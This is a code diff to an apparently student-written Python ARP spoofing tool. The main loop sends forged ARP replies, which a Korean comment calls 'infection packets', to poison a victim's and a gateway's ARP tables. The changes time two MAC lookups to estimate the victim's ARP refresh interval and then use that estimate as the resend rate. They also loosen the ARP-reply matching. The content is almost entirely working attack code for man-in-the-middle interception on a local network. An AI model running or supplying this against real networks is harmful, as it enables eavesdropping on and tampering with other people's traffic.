@@ -64,6 +64,7 @@ class ARP:
         self.gateway_ip = self._get_gateway_ip()
         self.name, self.ip, self.mac = self._get_my_interface_info()
         self.target_arp_refresh_interval = self.calc_arp_refresh()
+        print(self.target_arp_refresh_interval)
         self.victim_mac = self._get_mac(self.victim_ip)
         print("Get Victim's MAC address")
         self.gateway_mac = self._get_mac(self.gateway_ip)
@@ -82,6 +83,18 @@ class ARP:
         name, mac = self._get_interface_info(my_ip)
 
         return name, my_ip, mac
+
+    def calc_arp_refresh(self):
+        print("Calculate Victim's ARP table Refresh interval")
+
+        self._get_mac(self.victim_ip)
+        ft = time.time()  # first time
+        self._get_mac(self.victim_ip)
+        st = time.time()  # second time
+
+        print("Calc Done.")
+
+        return st - ft
 
     @staticmethod
     def _get_gateway_ip():
@@ -209,8 +222,6 @@ class ARP:
         :return: target's mac address
         """
 
-        print("Waiting For ARP-Reply...")
-
         s = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
 
         while True:
@@ -219,13 +230,12 @@ class ARP:
             ethernet_unpacked, arp_unpacked = self.get_headers(packet)
 
             src_ip = inet_ntoa(arp_unpacked[6])
-            dst_ip = inet_ntoa(arp_unpacked[8])
             mac = arp_unpacked[5]
 
             if ethernet_unpacked[2] != ARP_TYPE_ETHERNET_PROTOCOL:
                 continue
 
-            elif src_ip == target_ip and dst_ip == self.ip:
+            elif src_ip == target_ip:
                 return mac
 
 
@@ -312,7 +322,7 @@ def main():
 
     while True:
         arp.send_arp(ARP_REPLY_OP)
-        time.sleep(5)  # 5초 마다 감염 패킷 전송
+        time.sleep(arp.target_arp_refresh_interval)  # 5초 마다 감염 패킷 전송
 
 
 if __name__ == '__main__':
